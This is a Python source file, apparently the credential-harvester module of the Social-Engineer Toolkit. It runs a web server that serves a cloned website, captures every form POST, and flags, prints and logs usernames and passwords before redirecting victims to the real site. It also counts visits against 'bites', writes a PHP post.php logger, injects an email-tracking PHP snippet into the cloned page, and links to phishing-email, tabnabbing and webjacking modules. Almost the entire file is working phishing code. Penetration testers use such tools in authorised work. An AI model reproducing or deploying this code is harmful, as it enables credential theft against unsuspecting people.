#!/usr/bin/env python
import subprocess
import sys
import os
import re
import cgi
import BaseHTTPServer
import SimpleHTTPServer
import socket
from SocketServer import BaseServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import threading
import datetime
import shutil

# get path to normal
definepath = os.getcwd()
sys.path.append(definepath)

from src.core.setcore import *

apache_check = check_config("APACHE_SERVER=").lower()
webattack_email = check_config("WEBATTACK_EMAIL=").lower()
track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()

if track_email == "on":
	print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
	apache_check = "on"
# detect openssl module
try:
        from OpenSSL import SSL
# handle import error that openssl is not there
except ImportError:
        print "Python OpenSSL wasn't detected, note that SSL compatibility is now turned off"

############################################
#          Credential harvester            #
############################################

# define the current working directory
definepath=os.getcwd()
me = mod_name()

# append python to our current working directory
sys.path.append(definepath)

# import the base setcore libraries
from src.core.setcore import *

attack_vector=""
fileopen=file("src/program_junk/attack_vector", "r")
for line in fileopen:
        line=line.rstrip()
        if line == 'multiattack':
                attack_vector='multiattack'

# if attack vector isnt the multiattack
if attack_vector != "multiattack":
        print bcolors.RED + """
The best way to use this attack is if username and password form
fields are available. Regardless, this captures all POSTs on a website.""" + bcolors.ENDC
# see if we're tabnabbing or multiattack

# START WEB SERVER STUFF HERE
# scrape cloned website
sys.path.append("src/harvester/")
debug_msg(me,"importing 'src.webattack.harvester.scraper'",1)
try: reload("import scraper")
except: import scraper

homepath=os.getcwd()

# GRAB DEFAULT PORT FOR WEB SERVER AND CHECK FOR COMMAND CENTER
command_center="off"
fileopen=file("config/set_config" , "r").readlines()
counter=0
for line in fileopen:
        line=line.rstrip()
        match=re.search("WEB_PORT=", line)
        if match:
                line=line.replace("WEB_PORT=", "")
                web_port=line
                counter=1
        match2=re.search("COMMAND_CENTER=ON", line)
        if match2:
                command_center="on"
                command_center_write=file("%s/src/program_junk/cc_harvester_hit" % (definepath),"w")

# if nada default port 80
if counter == 0: web_port=80

# pull URL field
counter=0
fileopen=file("src/program_junk/site.template","r").readlines()
for line in fileopen:
        line=line.rstrip()
        match=re.search("URL=",line)
        if match:
                RAW_URL=line.replace("URL=", "")
                URL=line.replace("URL=http://", "")
                URL=line.replace("URL=https://", "")
                counter=1

# this checks the set_config to see if we need to redirect to a different website instead of the one cloned
harvester_redirect = check_config("HARVESTER_REDIRECT=").lower()
if harvester_redirect == "on":
        URL = check_config("HARVESTER_URL=")
        counter = 1

if counter== 0: URL=''

# set ssl flag to false by default (counter basically)
ssl_flag="false"
self_signed="false"
# SEE IF WE WANT TO USE SSL
fileopen=file("config/set_config" , "r").readlines()
for line in fileopen:
        line=line.rstrip()
        match=re.search("WEBATTACK_SSL=ON", line)
        if match:
                # if we hit on ssl being on, set flag to true
                ssl_flag='true'

        # if flag is true begin prepping SSL stuff
        if ssl_flag=='true':
                # set another loop for find other variables we need for SSL setup
                for line in fileopen:
                        # strip line feeds and carriage returns
                        line=line.rstrip()
                        # begin search for flags we need
                        match=re.search("SELF_SIGNED_CERT=ON", line)
                        # if we hit, lets create our own certificate
                        if match:
                                self_signed="true"
                                # need to import our ssl module for creating a CA
                                sys.path.append("src/core/ssl")
                                # import our ssl module
                                import setssl
                                subprocess.Popen("cp src/program_junk/CA/*.pem src/program_junk", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                                # remove old junk we dont need anymore
                                subprocess.Popen("rm -rf src/program_junk/CA;cp *.pem src/program_junk", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

                # if user wants to specify his/her own PEM certificate
                if self_signed== "false":
                        for line in fileopen:
                                line=line.rstrip()
                                # search for cert path
                                match=re.search("PEM_CLIENT=", line, flags=re.IGNORECASE)
                                if match:
                                        pem_client=line.replace("PEM_CLIENT=","")
                                        if not os.path.isfile(pem_client):
                                                print "\nUnable to find PEM file, check location and config again."
                                                exit_set()
                                        if os.path.isfile(pem_client):
                                                subprocess.Popen("cp %s src/program_junk/newcert.pem" % (pem_client), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                                match2=re.search("PEM_SERVER=", line)
                                if match2:
                                        pem_server=line.replace("PEM_SERVER=","")
                                        if not os.path.isfile(pem_server):
                                                print "\nUnable to find PEM file, check location and config again."
                                                exit_set()
                                        if os.path.isfile(pem_server):
                                                subprocess.Popen("cp %s src/program_junk/newreq.pem" % (pem_server), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        
# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)


# here is where we specify how many people actually visited versus fell for it
visits = file("src/program_junk/visits.file", "a")
bites = file("src/program_junk/bites.file", "a")

# SET Handler for handling POST requests and general setup through SSL
#class SETHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
class SETHandler(BaseHTTPRequestHandler):
        def setup(self):
                # added a try except block in case of transmission errors
                try:

                        self.connection = self.request
                        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
                        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

                # except errors and pass them
                except: pass
        
        # handle basic GET requests
        def do_GET(self):
        # import proper style css files here

                def handle_error(self, request, client_address):
                                            """Handle an error gracefully.  May be overridden.
                                               The default is to print a traceback and continue.
                                            """
                                            print '-'*40
                                            print 'Exception happened during processing of request from',
                                            print client_address
                                            import traceback
                                            traceback.print_exc() # XXX But this goes to stderr!
                                            print '-'*40
                                            pass


                counter = 0

                # try block setup to catch transmission errors
                try:

                        if self.path == "/":
                                self.send_response(200)
                                self.send_header('Content_type', 'text/html')
                                self.end_headers()
                                fileopen=file("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
                                for line in fileopen:
                                        self.wfile.write(line)
                                # write out that we had a visit
                                visits.write("hit\n")
                                #visits.close()
                                counter = 1
                        
                        # used for index2
                        if self.path == "/index2.html":
                                self.send_response(200)
                                self.send_header('Content_type', 'text/html')
                                self.end_headers()
                                fileopen=file("%s/src/program_junk/web_clone/index2.html" % (definepath), "r")
                                for line in fileopen:
                                        self.wfile.write(line)
                                # write out that we had a visit
                                visits.write("hit\n")
                                #visits.close()
                                counter = 1

			else:
				if os.path.isfile("%s/src/program_junk/web_clone/%s" % (definepath,self.path)):
					self.send_response(200)
#					self.send_header('Content-type', 'text/html')
					self.end_headers()
					fileopen=file("%s/src/program_junk/web_clone/%s" % (definepath,self.path), "rb")
					for line in fileopen:
						self.wfile.write(line)
					
                
                        # if the file wasn't found
                        if counter == 0:
                                if os.path.isfile("%s/src/program_junk/web_clone/%s" % (definepath,self.path)):
                                        fileopen=file("%s/src/program_junk/web_clone%s" % (definepath,self.path), "rb")
                                        for line in fileopen:
                                                self.wfile.write(line)
                                        fileopen.close()

                # handle errors, log them and pass through
                except Exception, e:
                        # log to set
                        log(e)
                        # pass exceptions to keep going
                        pass

        # handle POST requests
        def do_POST(self):
                length = int(self.headers.getheader('content-length'))
                qs = self.rfile.read(length)
                url=urldecode(qs)
                # specify we had a bite
                bites.write("hit\n")
                url=url.split("&")
                # change path to root for append on file
                os.chdir(homepath)
                # put the params into site.template for later user
                filewrite=file("src/program_junk/site.template","a")
                filewrite.write("\n")
		filewrite2 = file("src/logs/harvester.log", "a")
		filewrite.write("\n\n")
                print bcolors.RED+"[*] WE GOT A HIT! Printing the output:\r" + bcolors.GREEN
                for line in url:
                        counter=0
                        line=line.rstrip()
                        # if regular expression hit on user fields then do different
                        match=re.search("Email|email|login|logon|Logon|Login|user|username|Username",line)
                        if match:
                                print bcolors.RED+"POSSIBLE USERNAME FIELD FOUND: "+line+"\r" + bcolors.GREEN
                                counter=1
                        match2=re.search("pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass",line)
                        if match2:
                                print bcolors.RED+"POSSIBLE PASSWORD FIELD FOUND: "+line+"\r" + bcolors.GREEN
                                counter=1
                        filewrite.write(cgi.escape("PARAM: "+line+"\n"))
			filewrite2.write(line+"\n")
                        # if a counter hits at 0 then print this line 
                        if counter==0:
                                print "PARAM: "+line+"\r"
                        # reset counter
                        counter=0
        
                filewrite.write("BREAKHERE")
                filewrite.close()
		filewrite2.close()
        
                if attack_vector != 'multiattack':
                        print bcolors.RED+"[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\r\n\r\n" + bcolors.ENDC
        
                # pull URL field
                counter=0
                fileopen=file("src/program_junk/site.template","r").readlines()
                for line in fileopen:
                        line=line.rstrip()
                        match=re.search("URL=",line)
                        if match:
                                RAW_URL=line.replace("URL=", "")
                                URL=line.replace("URL=http://", "")
                                URL=line.replace("URL=https://", "")
                                counter=1
                        if counter== 0: URL=''

                # this checks the set_config to see if we need to redirect to a different website instead of the one cloned
                harvester_redirect = check_config("HARVESTER_REDIRECT=").lower()
                if harvester_redirect == "on":
                        RAW_URL = check_config("HARVESTER_URL=")
                        counter = 1        

                # when done posting send them back to the original site
                self.wfile.write('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
        
                # set it back to our homepage
                os.chdir(homepath+"/src/program_junk/web_clone/")

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

def run():

	# check if we are running apache mode
	if apache_check == "off":
        	try:
			server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
			server.serve_forever()

	        # handle keyboard interrupts
        	except KeyboardInterrupt:
                	os.chdir(homepath)
	                try:
        	                visits.close()
                	        bites.close()

	                except: pass
        	        if attack_vector != 'multiattack':
                	        sys.path.append("src/harvester")
                        	import report_generator
 	                if attack_vector != 'multiattack':
        	                return_continue()
                	os.chdir(homepath)
                	httpd.socket.close()

	        # handle the rest
        	except Exception, e:
                	log(e)
                	print bcolors.RED + "[*] Looks like the web_server can't bind to 80. Are you running Apache?" + bcolors.ENDC
			apache_stop = raw_input("Do you want to attempt to disable Apache? [y/n]: ")
			apache_counter = 0
			if apache_stop == "yes" or apache_stop == "y" or apache_stop == "":
	                        if os.path.isfile("/etc/init.d/apache2"):
        	                        subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
					apache_counter = 1
	                        if os.path.isfile("/etc/init.d/httpd"):
        	                        subprocess.Popen("/etc/init.d/httpd stop", shell=True).wait()
					apache_counter = 1
			if apache_counter == 1:
			        # check if we are running apache mode
				print_status("Successfully stopped Apache. Starting the credential harvester.")
				print_status("Harvester is ready, have victim browse to your site.")
			        if apache_check == "off":
				  try:
				  
			                try:
                        			server = ThreadedHTTPServer(('', int(web_port)), SETHandler)
			                        server.serve_forever()

			                # handle keyboard interrupts
                			except KeyboardInterrupt:
                        			os.chdir(homepath)
		                        try:
                		                visits.close()
                                		bites.close()

		                        except: pass
                		        if attack_vector != 'multiattack':
                                		sys.path.append("src/harvester")
		                                import report_generator
                		        if attack_vector != 'multiattack':
                                		return_continue()
		                        os.chdir(homepath)
                		        httpd.socket.close()
				  except Exception:
					apache_counter = 0

			if apache_counter == 0:
	                	print bcolors.GREEN + "[*] Try disabling Apache and try SET again." + bcolors.ENDC
        	        	print "[*] Printing error: "+ str(e) + "\n"
	        	        return_continue()
        	        	exit_set()

	# if we are using apache, then use the harvester php type that writes it out to post.php
	# note just change the index.html to post somewhere else and rename the post.php to something else
	if apache_check == "on":

		try:		
		        ipaddr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        		ipaddr.connect(('127.0.0.1', int(web_port)))
        		ipaddr.settimeout(2)
			if ipaddr: pass

		except Exception, e:
			if os.path.isfile("/etc/init.d/apache2"):
                        	apache_start = raw_input("[!] Apache may be not running, do you want SET to start the process? [y/n]: ")
				if apache_start == "y":
	                                subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()


		apache_dir = check_config("APACHE_DIRECTORY=")
		print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
		print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
		print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
		filewrite = file("%s/post.php" % (apache_dir), "w")
		now=datetime.datetime.today()
		filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now)) 
		filewrite.close()
		filewrite = file("%s/harvester_%s.txt" % (apache_dir,now), "w")
		filewrite.write("")
		filewrite.close()
		subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (apache_dir,now), shell=True).wait()
		# here we specify if we are tracking users and such
		if track_email.lower() == "on":
			fileopen = file ("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
			data = fileopen.read()
			data = data.replace("<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (now))
			filewrite = file("%s/src/program_junk/web_clone/index.2" % (definepath), "w")
			filewrite.write(data)
			filewrite.close()
			os.remove("%s/src/program_junk/web_clone/index.html" % (definepath))
			shutil.copyfile("%s/src/program_junk/web_clone/index.2" % (definepath), "%s/src/program_junk/web_clone/index.html" % (definepath))

		if os.path.isfile("%s/index.html" % (apache_dir)):
			os.remove("%s/index.html" % (apache_dir))
		if track_email.lower() == "off":
			shutil.copyfile("%s/src/program_junk/web_clone/index.html" % (definepath), "%s/index.html" % (apache_dir))
		if track_email.lower() == "on":
			shutil.copyfile("%s/src/program_junk/web_clone/index.html" % (definepath), "%s/index.php" % (apache_dir))
			print_status("NOTE: The URL to click on is index.php NOT index.html with track emails.")
		print_status("All files have been copied to %s" % (apache_dir))

		if attack_vector != 'multiattack':
			pause = raw_input("{Press return to continue}")

class SecureHTTPServer(HTTPServer):
    def __init__(self, server_address, HandlerClass):
        BaseServer.__init__(self, server_address, HandlerClass)
        # SSLv2 and SSLv3 supported
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        # pem files defined before
        fpem_priv = 'newreq.pem'
        fpem_cli = 'newcert.pem'
        # establish private key
        ctx.use_privatekey_file (fpem_priv)
        # establish public/client certificate
        ctx.use_certificate_file(fpem_cli)
        # setup the ssl socket
        self.socket = SSL.Connection(ctx, socket.socket(self.address_family,self.socket_type))
        # bind to interface
        self.server_bind()
        # activate the interface
        self.server_activate()

def ssl_server(HandlerClass = SETHandler,ServerClass = SecureHTTPServer):
        # bind to all interfaces on 443
        server_address = ('', 443) # (address, port)
        # setup the httpd server
        httpd = ServerClass(server_address, HandlerClass)
        # serve the httpd server until exit
        httpd.serve_forever()
if track_email == "on": webattack_email = "on"
# if emailer webattack, spawn email questions
if webattack_email == "on":	
	#try: 
	import src.phishing.smtp.client.smtp_web
	#except Exception, e:
	#	print e
#		reload(src.phishing.smtp.client.smtp_web)
	#	pause = raw_input("TEST")

# see if we're tabnabbing or multiattack
fileopen=file("src/program_junk/attack_vector", "r")
for line in fileopen:
        line=line.rstrip()
        if line == 'tabnabbing':
                print bcolors.RED+ "\n[*] Tabnabbing Attack Vector is Enabled...Victim needs to switch tabs."
        if line == 'webjacking':
                print bcolors.RED+ "\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link."

if ssl_flag == 'true':
        web_port="443"
        # check for PEM files here
        if not os.path.isfile("src/program_junk/newreq.pem"):
                print "PEM files not detected. SSL will not work properly."
        if not os.path.isfile("src/program_junk/newcert.pem"):
                print "PEM files not detected. SSL will not work properly."
        # copy over our PEM files
        #if self_signed =="true":
        subprocess.Popen("cp src/program_junk/*.pem src/program_junk/web_clone/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

# head over to cloned dir
os.chdir("src/program_junk/web_clone/")

if attack_vector != "multiattack":
        print bcolors.BLUE+"[*] Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"
        print "[*] Information will be displayed to you as it arrives below:\r" + bcolors.ENDC

# catch all
try:

        # if we are using ssl
        if ssl_flag == 'true':
                ssl_server()

        # if we aren't using ssl
        if ssl_flag == 'false':
                run()
except:
        pass

